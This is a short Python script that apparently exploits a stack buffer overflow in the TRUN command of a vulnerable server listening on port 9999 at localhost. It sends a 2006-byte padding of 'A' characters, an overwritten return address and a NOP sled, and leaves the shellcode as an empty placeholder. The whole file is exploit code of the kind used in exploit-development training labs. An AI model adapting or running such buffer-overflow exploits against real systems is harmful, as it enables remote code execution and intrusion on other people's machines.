import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("127.0.0.1", 9999))
buff = b'\x41' * 2006
shellcode = b''  # Replace with your actual shellcode
nop = b'\x90' * 16

overflow = b'TRUN .' + buff + b'\x05\x12\x50\x62' + nop
s.send(overflow)
s.close()